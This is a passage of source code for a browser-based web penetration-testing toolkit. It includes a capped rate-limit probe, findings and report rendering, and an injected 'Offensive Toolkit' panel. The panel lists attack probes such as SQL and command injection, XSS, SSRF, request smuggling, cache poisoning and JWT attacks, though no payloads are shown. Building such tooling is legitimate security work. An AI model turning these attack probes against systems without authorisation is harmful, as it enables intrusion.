    { name:'total',       label:'Total requests (max 500)', type:'number', default:'100' },
    { name:'concurrency', label:'Concurrency (max 20)',    type:'number', default:'5'  },
    { name:'rps',         label:'Max RPS (max 50)',        type:'number', default:'10' },
    { name:'abort_after', label:'Abort after N consecutive 429s', type:'number', default:'5' },
    { name:'timeout_s',   label:'Per-request timeout (s)', type:'number', default:'8' },
  ],
  auto: function(){
    return { url: L.activeTabUrl(), total:'100', concurrency:'5',
             rps:'10', abort_after:'5', timeout_s:'8' };
  },
  run: async function(inp){
    if (!inp.url) throw new Error('url required');
    var payload = {
      url:         inp.url,
      total:       Math.max(1,   Math.min(500, parseInt(inp.total, 10)  || 100)),
      concurrency: Math.max(1,   Math.min(20,  parseInt(inp.concurrency, 10) || 5)),
      rps:         Math.max(0.5, Math.min(50,  parseFloat(inp.rps) || 10)),
      abort_after: Math.max(1,   Math.min(50,  parseInt(inp.abort_after, 10) || 5)),
      timeout_s:   Math.max(1,   Math.min(30,  parseFloat(inp.timeout_s) || 8)),
    };
    var r = await backendPost('/tool/ratelimit-stress', payload);
    if (!r.data) throw new Error('stress endpoint returned '+r.status);
    if (r.data.error) throw new Error(r.data.error);
    var d = r.data;

    var statusRows = Object.keys(d.status_counts).map(function(k){
      var c = parseInt(k, 10);
      var col = c === 429 ? '#f59e0b' : c >= 500 ? '#f87171' : c >= 400 ? '#f59e0b' : '#10b981';
      return '<div class="result-kv"><span class="k" style="color:'+col+'">HTTP '+k+'</span>'
           + '<span class="v">'+d.status_counts[k]+'</span></div>';
    }).join('');

    var html = ''
      + '<div class="callout info">'
      +   '<b>Bounded probe.</b> At most '+payload.total+' requests, '
      +   'max '+payload.concurrency+' in flight, capped at '+payload.rps+' RPS, '
      +   'stops early after '+payload.abort_after+' consecutive 429s. '
      +   'It is not a load generator.</div>'
      + '<div class="report-summary">'
      +   '<div class="report-stat"><div class="n">'+d.sent+'</div><div class="l">sent</div></div>'
      +   '<div class="report-stat"><div class="n">'+d.completed+'</div><div class="l">done</div></div>'
      +   '<div class="report-stat low"><div class="n">'+d.p50+'ms</div><div class="l">p50</div></div>'
      +   '<div class="report-stat medium"><div class="n">'+d.p95+'ms</div><div class="l">p95</div></div>'
      +   '<div class="report-stat high"><div class="n">'+d.p99+'ms</div><div class="l">p99</div></div>'
      + '</div>'
      + '<div style="font-weight:700;margin:10px 0 6px;color:#38bdf8">Status distribution</div>'
      + statusRows
      + (d.throttled
          ? '<div class="finding high"><div class="finding-head">'
            + '<span class="sev high">THROTTLED</span>'
            + '<span class="title">Rate limiting detected</span></div>'
            + '<div class="finding-desc">The target began returning 429 after ~'
            + d.first_429_at + ' requests.</div>'
            + (d.retry_after
                ? '<div class="finding-evidence">Retry-After: '+esc(d.retry_after)+'</div>'
                : '')
            + '<div class="finding-remediation"><b>Note:</b> a 429 is a correct, '
            + 'defensive response — no remediation required unless the value is '
            + 'unreasonably permissive.</div></div>'
          : '<div class="finding low"><div class="finding-head">'
            + '<span class="sev low">INFO</span>'
            + '<span class="title">No throttling observed in this window</span></div>'
            + '<div class="finding-desc">The target absorbed all '
            + d.sent + ' requests without returning a single 429.</div></div>')
      + (d.hint ? '<div class="callout warn"><b>Hint:</b> '+esc(d.hint)+'</div>' : '');

    var findings = [];
    if (d.throttled){
      findings.push({
        severity:'info', cwe:'CWE-770',
        title:'Rate limiting engaged at ~'+d.first_429_at+' requests',
        desc:'Target returned 429 after ~'+d.first_429_at+' requests.',
        evidence: 'Retry-After: '+(d.retry_after||'(unset)'),
        remediation:'None — this is the expected defensive behaviour.',
        tabUrl: inp.url,
      });
    }
    return { html: html, findings: findings };
  },
});

// ================================================================
// UI
// ================================================================
var activeToolId = null;
var filterText = '';

function render(){
  var body = L.kitBody;
  body.innerHTML = '';

  var tabsBar = document.createElement('div');
  tabsBar.className = 'kit-tabs';
  tabsBar.innerHTML =
      '<button class="kit-tab'+(kitView==='tools'||kitView==='tool'?' active':'')+'" data-view="tools">🛠 Tools</button>'
    + '<button class="kit-tab'+(kitView==='tabs'?' active':'')+'" data-view="tabs" id="kit-tab-tabs">🗂 Tabs <span class="count">('+L.tabs().length+')</span></button>'
    + '<button class="kit-tab'+(kitView==='findings'?' active':'')+'" data-view="findings" id="kit-tab-findings">🚩 Findings <span class="count">('+findings.length+')</span></button>'
    + '<button class="kit-tab'+(kitView==='report'?' active':'')+'" data-view="report">📊 Report</button>';
  body.appendChild(tabsBar);

  tabsBar.querySelectorAll('.kit-tab').forEach(function(b){
    b.onclick = function(){ kitView = b.dataset.view; activeToolId = null; render(); };
  });

  var main = document.createElement('div');
  main.id = 'kit-main';
  body.appendChild(main);

  if (kitView === 'tools')         renderTools(main);
  else if (kitView === 'tool')     renderToolView(main);
  else if (kitView === 'tabs')     renderTabsView(main);
  else if (kitView === 'findings') renderFindings(main);
  else if (kitView === 'report')   renderReport(main);
}

function renderTools(root){
  var search = document.createElement('input');
  search.placeholder = 'Filter tools…';
  search.value = filterText;
  search.style.cssText = 'width:100%;padding:10px 14px;background:#070b16;color:#e2e8f0;'
    +'border:1px solid rgba(148,163,184,.2);border-radius:9px;font-family:inherit;'
    +'font-size:12.5px;outline:none;margin-bottom:14px';
  search.oninput = function(){ filterText = search.value; renderTools(root); };
  root.innerHTML = '';
  root.appendChild(search);

  var f = filterText.toLowerCase();
  var totalShown = 0;

  CATEGORIES.forEach(function(cat){
    var tools = Object.keys(TOOLS).map(function(k){return TOOLS[k];}).filter(function(t){
      if (t.category !== cat.id) return false;
      if (!f) return true;
      return t.name.toLowerCase().indexOf(f) !== -1
        || (t.description||'').toLowerCase().indexOf(f) !== -1
        || t.id.indexOf(f) !== -1;
    });
    if (!tools.length) return;
    totalShown += tools.length;

    var catEl = document.createElement('div');
    catEl.className = 'kit-cat';
    catEl.innerHTML = '<div class="kit-cat-title">'+esc(cat.name)
      +' <span class="count">('+tools.length+')</span></div>';
    var grid = document.createElement('div');
    grid.className = 'kit-grid';
    tools.forEach(function(t){
      var tile = document.createElement('button');
      tile.className = 'kit-tile';
      tile.innerHTML = '<span class="ti-icon">'+esc(t.icon||'•')+'</span>'
        +'<span class="ti-name">'+esc(t.name)+'</span>'
        +'<span class="ti-desc">'+esc(t.description||'')+'</span>';
      tile.onclick = function(){
        activeToolId = t.id;
        kitView = 'tool';
        render();
      };
      grid.appendChild(tile);
    });
    catEl.appendChild(grid);
    root.appendChild(catEl);
  });
  if (!totalShown){
    root.innerHTML += '<div class="result-msg info">No tools match.</div>';
  }
}

function renderToolView(root){
  var t = TOOLS[activeToolId];
  if (!t){ kitView = 'tools'; render(); return; }
  var back = document.createElement('button');
  back.className = 'btn small';
  back.textContent = '← Back';
  back.style.marginBottom = '12px';
  back.onclick = function(){ kitView = 'tools'; activeToolId = null; render(); };
  root.appendChild(back);

  var form = document.createElement('div');
  form.className = 'tool-form';
  form.innerHTML = '<div class="tool-form-head"><div>'
    +'<div class="title">'+esc(t.icon||'')+' '+esc(t.name)+'</div>'
    +'<div class="subtitle">'+esc(t.description||'')+'</div></div></div>';

  var auto = {};
  try { if (t.auto) auto = t.auto() || {}; } catch(e){}

  var fields = t.fields || [];
  var values = {};
  fields.forEach(function(f){
    values[f.name] = auto[f.name] !== undefined ? auto[f.name]
      : (f.default !== undefined ? f.default : '');
    var wrap = document.createElement('div');
    wrap.className = 'field';
    var label = document.createElement('label');
    label.textContent = f.label || f.name;
    wrap.appendChild(label);
    var input;
    if (f.type === 'textarea'){
      input = document.createElement('textarea');
      input.value = values[f.name];
      if (f.placeholder) input.placeholder = f.placeholder;
    } else if (f.type === 'select'){
      input = document.createElement('select');
      (f.options||[]).forEach(function(o){
        var opt = document.createElement('option');
        opt.value = o; opt.textContent = o;
        if (o === values[f.name]) opt.selected = true;
        input.appendChild(opt);
      });
    } else {
      input = document.createElement('input');
      input.type = f.type || 'text';
      input.value = values[f.name];
      if (f.placeholder) input.placeholder = f.placeholder;
    }
    input.oninput = input.onchange = function(){ values[f.name] = input.value; };
    wrap.appendChild(input);
    form.appendChild(wrap);
  });

  var actions = document.createElement('div');
  actions.className = 'tool-actions';
  var runBtn = document.createElement('button');
  runBtn.className = 'btn primary';
  runBtn.textContent = '▶ Run';
  var clearBtn = document.createElement('button');
  clearBtn.className = 'btn';
  clearBtn.textContent = 'Clear';
  actions.appendChild(runBtn);
  actions.appendChild(clearBtn);
  form.appendChild(actions);
  root.appendChild(form);

  var resultHost = document.createElement('div');
  root.appendChild(resultHost);

  clearBtn.onclick = function(){ renderToolView(root); };

  runBtn.onclick = async function(){
    runBtn.disabled = true;
    runBtn.textContent = 'Running…';
    resultHost.innerHTML = '<div class="result-msg info"><span class="spinner-inline"></span> Running…</div>';
    try {
      var out = await t.run(values);
      if (out && out.findings && out.findings.length){
        out.findings.forEach(function(f){
          addFinding(Object.assign({}, f, {toolId: t.id, toolName: t.name}));
        });
        updateCount();
      }
      resultHost.innerHTML = out && out.html ? out.html : '<div class="result-msg ok">Done.</div>';
    } catch(e){
      resultHost.innerHTML = '<div class="result-msg err">'+esc(e.message || String(e))+'</div>';
    } finally {
      runBtn.disabled = false;
      runBtn.textContent = '▶ Run';
    }
  };
}

function renderTabsView(root){
  var tabs   = L.tabs();
  var active = L.activeTab();
  var activeId = active ? active.id : null;

  var html = '<div style="display:flex;gap:6px;margin-bottom:14px;'
           + 'flex-wrap:wrap;align-items:center">'
    + '<span style="color:#94a3b8;font-size:12.5px;margin-right:auto">'
    +   tabs.length + ' tab' + (tabs.length===1?'':'s') + ' open</span>'
    + '<button class="btn small" id="kit-tab-refresh">↻ Refresh</button>'
    + '<button class="btn small" id="kit-tab-closeothers"'
    +   (tabs.length<=1?' disabled':'')+'>Close others</button>'
    + '<button class="btn small danger" id="kit-tab-closeall"'
    +   (tabs.length?'':' disabled')+'>Close all</button>'
    + '</div>';

  if (!tabs.length){
    html += '<div class="result-msg info">No tabs open. '
          + 'Use the <b>+</b> button in the main toolbar to start one.</div>';
    root.innerHTML = html;
    return;
  }

  html += tabs.map(function(t, i){
    var isActive = t.id === activeId;
    return '<div style="display:flex;align-items:center;gap:10px;'
      + 'padding:10px 12px;margin-bottom:6px;border-radius:10px;'
      + 'background:' + (isActive?'rgba(56,189,248,.08)':'#070b16') + ';'
      + 'border:1px solid ' + (isActive?'rgba(56,189,248,.35)':'rgba(148,163,184,.1)') + ';'
      + 'transition:.15s">'
      + '<span style="color:#64748b;font-family:\'JetBrains Mono\',monospace;'
      +   'font-size:11px;width:22px;text-align:center;flex-shrink:0">'
      +   (i+1) + '</span>'
      + '<div style="flex:1;min-width:0">'
      +   '<div style="font-weight:600;font-size:12.5px;color:'
      +     (isActive?'#38bdf8':'#e2e8f0')+';overflow:hidden;'
      +     'text-overflow:ellipsis;white-space:nowrap">'
      +     esc(t.title || 'New tab') + '</div>'
      +   '<div style="color:#64748b;font-size:10.5px;overflow:hidden;'
      +     'text-overflow:ellipsis;white-space:nowrap;'
      +     'font-family:\'JetBrains Mono\',monospace;margin-top:2px">'
      +     esc(t.url || '(empty)') + '</div>'
      + '</div>'
      + '<button class="btn small" data-act="focus" data-id="'+t.id+'"'
      +   (isActive?' disabled':'')+'>Focus</button>'
      + '<button class="btn small danger" data-act="close" data-id="'+t.id+'"'
      +   ' aria-label="Close tab" title="Close tab">✕</button>'
      + '</div>';
  }).join('');

  root.innerHTML = html;

  function refresh(){ render(); }

  root.querySelectorAll('[data-act]').forEach(function(b){
    b.onclick = function(){
      var id = b.dataset.id;
      if (b.dataset.act === 'close'){
        L.closeTab(id, { silent:true, showToast:false });
      } else if (b.dataset.act === 'focus'){
        L.activateTab(id);
      }
      refresh();
    };
  });

  var r = root.querySelector('#kit-tab-refresh');
  if (r) r.onclick = refresh;

  var co = root.querySelector('#kit-tab-closeothers');
  if (co) co.onclick = function(){
    if (!activeId) return;
    L.tabs().slice().forEach(function(t){
      if (t.id !== activeId) L.closeTab(t.id, { silent:true, showToast:false });
    });
    toast('Closed all other tabs');
    refresh();
  };

  var ca = root.querySelector('#kit-tab-closeall');
  if (ca) ca.onclick = function(){
    L.tabs().slice().forEach(function(t){
      L.closeTab(t.id, { silent:true, showToast:false });
    });
    toast('Closed all tabs');
    refresh();
  };
}

function renderFindings(root){
  if (!findings.length){
    root.innerHTML = '<div class="result-msg info">No findings yet. Run a tool that produces findings (headers, cookies, CORS, etc.)</div>';
    return;
  }
  var counts = {critical:0,high:0,medium:0,low:0,info:0};
  findings.forEach(function(f){ counts[f.severity] = (counts[f.severity]||0)+1; });
  var summary = Object.keys(counts).map(function(k){
    if (!counts[k]) return '';
    return '<div class="report-stat '+k+'"><div class="n">'+counts[k]+'</div>'
      +'<div class="l">'+k+'</div></div>';
  }).join('');
  var sorted = findings.slice().sort(function(a,b){
    var order = {critical:0,high:1,medium:2,low:3,info:4};
    return (order[a.severity]||5) - (order[b.severity]||5);
  });
  var html = '<div class="report-summary">'+summary+'</div>';
  html += '<div style="display:flex;gap:6px;margin-bottom:12px">'
    + '<button class="btn small" id="kit-findings-dl">⬇ Export JSON</button>'
    + '<button class="btn small" id="kit-findings-md">⬇ Export MD</button>'
    + '<button class="btn small" id="kit-findings-clear">Clear</button>'
    + '</div>';
  sorted.forEach(function(f){
    html += '<div class="finding '+f.severity+'">'
      + '<div class="finding-head">'
      + '<span class="sev '+f.severity+'">'+f.severity+'</span>'
      + '<span class="title">'+esc(f.title||'')+'</span>'
      + (f.cwe ? '<span class="cwe">'+esc(f.cwe)+'</span>' : '')
      + '</div>'
      + (f.desc ? '<div class="finding-desc">'+esc(f.desc)+'</div>' : '')
      + (f.evidence ? '<pre class="finding-evidence">'+esc(f.evidence)+'</pre>' : '')
      + (f.remediation ? '<div class="finding-remediation"><b>Fix:</b> '+esc(f.remediation)+'</div>' : '')
      + '<div class="finding-meta">'
      + (f.toolName ? '<span>Tool: '+esc(f.toolName)+'</span>' : '')
      + (f.tabUrl ? '<span>'+esc(f.tabUrl)+'</span>' : '')
      + '</div></div>';
  });
  root.innerHTML = html;
  var dlj = root.querySelector('#kit-findings-dl');
  if (dlj) dlj.onclick = function(){ dl('findings.json', JSON.stringify(findings, null, 2)); };
  var dlm = root.querySelector('#kit-findings-md');
  if (dlm) dlm.onclick = function(){
    var md = '# Lynk Findings\n\n';
    sorted.forEach(function(f){
      md += '## ['+f.severity.toUpperCase()+'] '+f.title+'\n\n'
        + (f.cwe ? '- **CWE**: '+f.cwe+'\n' : '')
        + (f.desc ? '- **Description**: '+f.desc+'\n' : '')
        + (f.evidence ? '- **Evidence**:\n  ```\n  '+f.evidence.replace(/\n/g,'\n  ')+'\n  ```\n' : '')
        + (f.remediation ? '- **Fix**: '+f.remediation+'\n' : '')
        + (f.tabUrl ? '- **URL**: '+f.tabUrl+'\n' : '')
        + '\n';
    });
    dl('findings.md', md);
  };
  var clr = root.querySelector('#kit-findings-clear');
  if (clr) clr.onclick = function(){
    if (confirm('Clear all findings?')){ clearFindings(); render(); }
  };
}

function renderReport(root){
  if (!findings.length){
    root.innerHTML = '<div class="result-msg info">No findings to report.</div>';
    return;
  }
  var counts = {critical:0,high:0,medium:0,low:0,info:0};
  findings.forEach(function(f){ counts[f.severity] = (counts[f.severity]||0)+1; });
  var summary = Object.keys(counts).map(function(k){
    if (!counts[k]) return '';
    return '<div class="report-stat '+k+'"><div class="n">'+counts[k]+'</div>'
      +'<div class="l">'+k+'</div></div>';
  }).join('');
  var byTool = {};
  findings.forEach(function(f){
    var key = f.toolName || 'other';
    (byTool[key] = byTool[key] || []).push(f);
  });
  var sections = Object.keys(byTool).map(function(k){
    var items = byTool[k];
    return '<div style="margin-bottom:20px"><div style="font-weight:700;color:#38bdf8;'
      +'margin-bottom:8px">'+esc(k)+' <span style="color:#64748b">('+items.length+')</span></div>'
      + items.map(function(f){
          return '<div class="finding '+f.severity+'">'
            + '<div class="finding-head"><span class="sev '+f.severity+'">'+f.severity+'</span>'
            + '<span class="title">'+esc(f.title||'')+'</span></div>'
            + (f.tabUrl ? '<div class="finding-meta"><span>'+esc(f.tabUrl)+'</span></div>' : '')
            + '</div>';
        }).join('')
      + '</div>';
  }).join('');
  root.innerHTML = '<div class="report-summary">'+summary+'</div>'
    + '<div style="display:flex;gap:6px;margin-bottom:14px">'
    + '<button class="btn small" id="kit-report-html">⬇ Full HTML report</button>'
    + '<button class="btn small" id="kit-report-json">⬇ JSON</button>'
    + '</div>'
    + sections;
  var htmlBtn = root.querySelector('#kit-report-html');
  if (htmlBtn) htmlBtn.onclick = function(){
    var html = '<!DOCTYPE html><html><head><meta charset="utf-8">'
      +'<title>Lynk Report</title><style>'
      +'body{font-family:Inter,system-ui,sans-serif;background:#070b16;color:#e2e8f0;padding:24px;max-width:900px;margin:auto}'
      +'.finding{padding:12px;background:#0d1526;border-radius:8px;margin-bottom:8px;border-left:3px solid #38bdf8}'
      +'.finding.critical{border-left-color:#dc2626}.finding.high{border-left-color:#f87171}'
      +'.finding.medium{border-left-color:#f59e0b}.finding.low{border-left-color:#38bdf8}'
      +'pre{background:#020617;padding:8px;border-radius:5px;font-size:11px;overflow:auto;white-space:pre-wrap}'
      +'h1{font-size:22px}h2{font-size:16px;color:#38bdf8}'
      +'</style></head><body><h1>Lynk Report</h1><p>Generated '+new Date().toISOString()+'</p>';
    Object.keys(byTool).forEach(function(k){
      html += '<h2>'+k+' ('+byTool[k].length+')</h2>';
      byTool[k].forEach(function(f){
        html += '<div class="finding '+f.severity+'">'
          + '<b>['+f.severity.toUpperCase()+']</b> '+esc(f.title||'')
          + (f.desc ? '<p>'+esc(f.desc)+'</p>' : '')
          + (f.evidence ? '<pre>'+esc(f.evidence)+'</pre>' : '')
          + (f.remediation ? '<p><b>Fix:</b> '+esc(f.remediation)+'</p>' : '')
          + '</div>';
      });
    });
    html += '</body></html>';
    dl('lynk_report.html', html);
  };
  var jsonBtn = root.querySelector('#kit-report-json');
  if (jsonBtn) jsonBtn.onclick = function(){ dl('report.json', JSON.stringify({findings: findings}, null, 2)); };
}

window.addEventListener('lynk:tabs-changed', function(){
  var badge = document.querySelector('#kit-tab-tabs .count');
  if (badge && L && L.tabs) badge.textContent = '('+L.tabs().length+')';
  if (kitView === 'tabs'){
    var main = document.querySelector('#kit-main');
    if (main) renderTabsView(main);
  }
});

render();
})();
"""


# ======================================================================
# PANEL_JS — the 45-tool panel injected into proxied pages (unchanged)
# ======================================================================
PANEL_JS = r"""
(function(){
if(window.__LYNK_PANEL__)return; window.__LYNK_PANEL__=true;
var ctx = window.__LYNK_CTX__ || {};
var upstream = ctx.upstream || '';
if (!upstream) return;
var upEnc = encodeURIComponent(upstream);

function ensureModal(){
  var m = document.getElementById('__lynk_modal');
  if (m) return m;
  m = document.createElement('div');
  m.id = '__lynk_modal';
  m.setAttribute('role','dialog');
  m.setAttribute('aria-modal','true');
  m.style.cssText = 'position:fixed;inset:0;background:rgba(2,6,23,.82);z-index:2147483647;'
    +'display:none;align-items:center;justify-content:center;padding:20px;'
    +'backdrop-filter:blur(6px);animation:__lynkfade .18s ease';
  m.innerHTML = '<div id="__lynk_mwrap" style="background:#0d1526;'
    +'border:1px solid rgba(148,163,184,.18);border-radius:16px;'
    +'max-width:1200px;width:100%;max-height:92vh;display:flex;flex-direction:column;'
    +'font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Inter,sans-serif;color:#e2e8f0;'
    +'overflow:hidden;box-shadow:0 40px 80px -20px rgba(0,0,0,.8),0 0 0 1px rgba(56,189,248,.08);'
    +'animation:__lynkslide .22s cubic-bezier(.34,1.36,.64,1)">'
    +'<div style="padding:16px 20px;border-bottom:1px solid rgba(148,163,184,.18);'
    +'display:flex;justify-content:space-between;align-items:center;flex-shrink:0;'
    +'background:linear-gradient(180deg,rgba(56,189,248,.05),transparent)">'
      +'<div style="display:flex;align-items:center;gap:10px">'
        +'<div id="__lynk_micon" style="width:32px;height:32px;border-radius:9px;'
        +'background:linear-gradient(135deg,#38bdf8,#818cf8);display:grid;place-items:center;'
        +'color:#0b1220;font-size:16px;font-weight:800">L</div>'
        +'<div><div id="__lynk_mtitle" style="font-weight:700;font-size:15px;letter-spacing:-.01em"></div>'
        +'<div id="__lynk_msub" style="font-size:11px;color:#64748b;margin-top:1px"></div></div>'
      +'</div>'
      +'<button id="__lynk_mclose" aria-label="Close" style="background:rgba(148,163,184,.08);'
      +'border:none;color:#94a3b8;width:32px;height:32px;border-radius:9px;font-size:16px;'
      +'cursor:pointer;display:grid;place-items:center;transition:.15s">✕</button>'
    +'</div>'
    +'<div id="__lynk_mbody" style="padding:20px;overflow:auto;flex:1;font-size:13px;'
    +'scrollbar-width:thin;scrollbar-color:rgba(148,163,184,.3) transparent"></div>'
    +'<div id="__lynk_mfoot" style="padding:12px 20px;border-top:1px solid rgba(148,163,184,.14);'
    +'display:none;flex-shrink:0;justify-content:flex-end;gap:8px;background:rgba(2,6,23,.4)"></div>'
    +'</div>';
  document.body.appendChild(m);
  if (!document.getElementById('__lynkanim')){
    var s = document.createElement('style'); s.id = '__lynkanim';
    s.textContent = '@keyframes __lynkfade{from{opacity:0}to{opacity:1}}'
      +'@keyframes __lynkslide{from{transform:translateY(24px) scale(.98);opacity:0}'
      +'to{transform:translateY(0) scale(1);opacity:1}}';
    document.head.appendChild(s);
  }
  m.querySelector('#__lynk_mclose').onclick = function(){ m.style.display='none'; };
  m.onclick = function(e){ if (e.target === m) m.style.display='none'; };
  document.addEventListener('keydown', function(e){
    if (e.key === 'Escape' && m.style.display !== 'none') m.style.display = 'none';
  });
  return m;
}

function showModal(title, html, sub){
  var m = ensureModal();
  m.querySelector('#__lynk_mtitle').textContent = title;
  m.querySelector('#__lynk_msub').textContent = sub || upstream;
  var body = m.querySelector('#__lynk_mbody');
  body.innerHTML = html;
  m.style.display = 'flex';
  return body;
}

function escHtml(s){
  return String(s).replace(/[&<>"']/g, function(c){
    return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
  });
}
async function apiJSON(path, opts){
  var r = await fetch(path, Object.assign({credentials:'same-origin'}, opts||{}));
  return r.json();
}
async function api(path, opts){
  return fetch(path, Object.assign({credentials:'same-origin'}, opts||{}));
}
function dl(name, text){
  var b = new Blob([text], {type:'text/plain'});
  var a = document.createElement('a'); a.href = URL.createObjectURL(b);
  a.download = name; a.click(); URL.revokeObjectURL(a.href);
}
function urlparse(u){ try{ return new URL(u); }catch(e){ return {hostname:''}; } }

// ---------- FAB ----------
var fab = document.createElement('div');
fab.setAttribute('role','button');
fab.setAttribute('tabindex','0');
fab.setAttribute('aria-label','Open toolkit');
fab.innerHTML = '🛠';
fab.style.cssText = 'position:fixed;bottom:18px;right:18px;width:56px;height:56px;'
  +'border-radius:50%;background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;'
  +'display:grid;place-items:center;font-size:26px;cursor:pointer;'
  +'box-shadow:0 12px 32px -8px rgba(56,189,248,.6),0 0 0 4px rgba(56,189,248,.12);'
  +'z-index:2147483647;user-select:none;font-family:sans-serif;'
  +'transition:transform .15s ease,box-shadow .15s ease;';
fab.onmouseenter = function(){ fab.style.transform='scale(1.06)'; };
fab.onmouseleave = function(){ fab.style.transform='scale(1)'; };
fab.onkeydown = function(e){ if (e.key==='Enter'||e.key===' ') openPanel(); };
document.body.appendChild(fab);

// ---------- Panel ----------
var panel = document.createElement('aside');
panel.setAttribute('role','complementary');
panel.style.cssText = 'position:fixed;top:38px;right:-460px;width:460px;'
  +'height:calc(100% - 38px);background:#0d1526;'
  +'border-left:1px solid rgba(148,163,184,.16);'
  +'font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Inter,sans-serif;'
  +'color:#e2e8f0;z-index:2147483646;transition:right .26s cubic-bezier(.34,1.36,.64,1);'
  +'display:flex;flex-direction:column;overflow:hidden;'
  +'box-shadow:-24px 0 60px -20px rgba(0,0,0,.7)';
panel.innerHTML = ''
  +'<div style="padding:16px 18px;border-bottom:1px solid rgba(148,163,184,.16);'
   +'display:flex;align-items:center;justify-content:space-between;flex-shrink:0;'
   +'background:linear-gradient(180deg,rgba(56,189,248,.06),transparent)">'
    +'<div><div style="font-size:10px;color:#64748b;letter-spacing:.14em;font-weight:700">LYNKIO</div>'
    +'<div style="font-weight:800;font-size:16px;letter-spacing:-.01em;margin-top:2px">Offensive Toolkit</div></div>'
    +'<button id="__lynk_close" aria-label="Close panel" style="background:rgba(148,163,184,.08);'
    +'border:none;color:#94a3b8;width:30px;height:30px;border-radius:8px;font-size:15px;'
    +'cursor:pointer">✕</button>'
  +'</div>'
  +'<div id="__lynk_target" style="padding:10px 18px;font-size:11px;color:#94a3b8;'
   +'border-bottom:1px solid rgba(148,163,184,.16);white-space:nowrap;overflow:hidden;'
   +'text-overflow:ellipsis;flex-shrink:0;font-family:ui-monospace,monospace" '
   +'title="'+escHtml(upstream)+'">'+escHtml(upstream)+'</div>'
  +'<div style="padding:10px 12px 6px;flex-shrink:0">'
    +'<input id="__lynk_filter" placeholder="Filter tools…" style="width:100%;'
    +'padding:9px 12px;background:#070b16;color:#e2e8f0;border:1px solid rgba(148,163,184,.2);'
    +'border-radius:9px;font-family:inherit;font-size:12.5px;outline:none"/>'
  +'</div>'
  +'<nav id="__lynk_nav" style="flex:1;overflow-y:auto;padding:4px 6px 6px;'
   +'scrollbar-width:thin;scrollbar-color:rgba(148,163,184,.3) transparent"></nav>'
  +'<div style="padding:10px 12px;border-top:1px solid rgba(148,163,184,.16);'
   +'display:flex;gap:6px;flex-shrink:0">'
    +'<button id="__lynk_home" style="flex:1;padding:10px;border-radius:9px;'
    +'border:none;background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;'
    +'font-weight:700;cursor:pointer;font-family:inherit;font-size:12.5px">⌂ Home</button>'
    +'<button id="__lynk_tabs" style="padding:10px 14px;border-radius:9px;'
    +'border:1px solid rgba(148,163,184,.22);background:transparent;color:#e2e8f0;'
    +'cursor:pointer;font-family:inherit;font-size:12.5px;font-weight:600">🗂️</button>'
  +'</div>';
document.body.appendChild(panel);

var SECTIONS = [
  ['Recon & Fingerprint', [
    ['vulnscan','🛡️','Vulnerability Scan','Full 240+ checks across headers, cookies, JS, paths'],
    ['subdomains','🌐','Subdomain Enum','Certificate Transparency + DNS bruteforce seed'],
    ['portscan','📡','Port Scan','Common ports + banner grabbing'],
    ['ssltls','🔐','SSL / TLS Info','Certificate, cipher, ALPN, SANs'],
    ['tlsaudit','🧪','TLS Audit','Downgrade + weak cipher probes'],
    ['waf','🔥','WAF Detect','Signature + evasion probes'],
    ['wayback','🕰️','Wayback','Archived snapshots'],
    ['favicon','🎨','Favicon Hash','Favicon mmh3/Shodan hash'],
    ['dns','🌍','DNS / IP','A/AAAA/MX/TXT/NS lookup'],
    ['dnsdeep','🔭','DNS Deep','Zone transfer, common SRV, wildcard check'],
    ['robots','🤖','robots.txt',''],
    ['sitemap','🗺️','sitemap.xml',''],
    ['wellknown','📜','Well-Known','.well-known discovery'],
  ]],
  ['Injection Probes', [
    ['sqli','💉','SQL Injection','Error + boolean + time + union probes'],
    ['nosqli','🔩','NoSQL Injection','Mongo-style operator + regex probes'],
    ['xss','⚡','XSS','Reflected + DOM + polyglot probes'],
    ['ssti','🧩','SSTI','Jinja / Twig / Freemarker / Velocity'],
    ['cmdi','⌨️','Command Injection','Shell metacharacter + timing probes'],
    ['lfi','📂','LFI / Path Traversal','Linux + Windows + PHP wrapper'],
    ['rfi','📡','Remote File Inclusion','Protocol + URL probes'],
    ['xxe','📦','XXE','In-band + OOB detection'],
    ['ssrf','🕸️','SSRF','Internal endpoints + cloud metadata'],
    ['crlf','↩️','CRLF Injection','Header + body injection'],
    ['op_redirect','➡️','Open Redirect','Bypass patterns'],
    ['massassign','🏷️','Mass Assignment','Role/is_admin field injection'],
    ['prototype','🧬','Prototype Pollution','__proto__ + constructor'],
    ['domclob','🧱','DOM Clobbering','id/name collision probes'],
  ]],
  ['HTTP Deep', [
    ['smuggling','🚢','HTTP Smuggling','TE/CL desync probes'],
    ['cache_poison','🧊','Cache Poisoning','Unkeyed header probes'],
    ['cache_deceive','🎭','Cache Deception','Extension tricks'],
    ['host_header','🏠','Host Header Injection','Host / X-Forwarded-Host'],
    ['method_override','🔀','Method Override','X-HTTP-Method-Override'],
    ['ratelimit','⏱️','Rate Limit Detect','Burst probe + headers'],
    ['cors_deep','🔓','CORS Deep','Origin reflection + subdomain'],
    ['hsts_audit','📮','HSTS Audit','Preload + subdomain probes'],
  ]],
  ['Auth & Session', [
    ['jwt','🎫','JWT Analyzer','Header + payload + weakness'],
    ['jwt_attack','🔨','JWT Attacks','alg=none, kid traversal, weak key'],
    ['oauth','🔑','OAuth Probe','redirect_uri + state probes'],
    ['session','🎟️','Session Probe','Cookie flags + entropy'],
    ['clickjack','🖱️','Clickjacking','Framing headers'],
    ['tabnabbing','🔙','Reverse Tabnabbing','target=_blank rel check'],
  ]],
  ['Enumeration', [
    ['brute','📁','Directory Brute','Wordlist probe with soft-404 detection'],
    ['dirview','🗂️','Directory Viewer',''],
    ['jsendpoints','🕸️','JS Endpoints','Extract from inline + external'],
    ['sourcemap','🗺️','Source Map Hunt','.map discovery + parse'],
    ['graphql','🔮','GraphQL Introspect',''],
    ['graphql_fuzz','💥','GraphQL Fuzz','Field / depth / alias probes'],
    ['api_discover','🔌','API Discovery','Common API path patterns'],
    ['params','🔍','Parameter Discovery','Hidden param brute'],
    ['links','🔗','Links & Forms',''],
  ]],
  ['Analyze', [
    ['domex','🧭','DOM Explorer','Walk every element with filters'],
    ['diag','🩺','Diagnose URL','DNS + TCP + TLS breakdown'],
    ['headers','📡','Response Headers',''],
    ['scan','🧬','Tech Fingerprint',''],
    ['source','📄','Page Source',''],
